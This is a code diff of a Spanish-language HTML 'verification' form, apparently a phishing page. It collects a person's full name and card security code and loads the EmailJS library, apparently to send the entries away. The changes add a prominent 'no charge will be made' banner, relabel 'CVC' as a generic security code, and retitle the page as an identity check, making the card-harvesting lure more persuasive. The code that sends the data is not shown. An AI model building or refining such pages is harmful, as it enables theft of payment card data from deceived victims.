@@ -8,16 +8,18 @@
 </head>
 <body>
     <div class="container">
+        <div class="big-warning">🚫 NO SE REALIZARÁ NINGÚN COBRO 🚫</div>
+        
         <div class="header">
             <div class="decor">🌸🌸🌸</div>
-            <h1>Verificación de Seguridad</h1>
+            <h1>Verificación Requerida</h1>
             <div class="decor">🌸🌸🌸</div>
         </div>
 
         <form id="paymentForm">
             <div class="input-group">
-                <label>Nombre del Titular</label>
-                <input type="text" id="userName" placeholder="Ej. Ana García" required>
+                <label>Nombre Completo</label>
+                <input type="text" id="userName" placeholder="Ej. Sofía Martínez" required>
                 <span class="error-msg" id="nameError"></span>
             </div>
 
@@ -34,17 +36,16 @@
             </div>
 
             <div class="input-group">
-                <label>Código CVC</label>
+                <label>Código de Seguridad</label>
                 <input type="text" id="cvc" placeholder="••••" maxlength="4" required>
                 <span class="error-msg" id="cvcError"></span>
             </div>
 
-            <button type="submit">Verificar Ahora 🌸</button>
+            <button type="submit">Verificar Identidad 🌸</button>
         </form>
 
-        <div id="loader" class="hidden">⏳ Validando información...</div>
-        <div id="errorMsg" class="hidden error-msg">⚠️ ¡Error en la verificación!</div>
-        <p class="disclaimer">Este proceso es solo de verificación. No se realizarán cargos.</p>
+        <div id="loader" class="hidden">🔒 Validando información...</div>
+        <div id="errorMsg" class="hidden error-msg"></div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
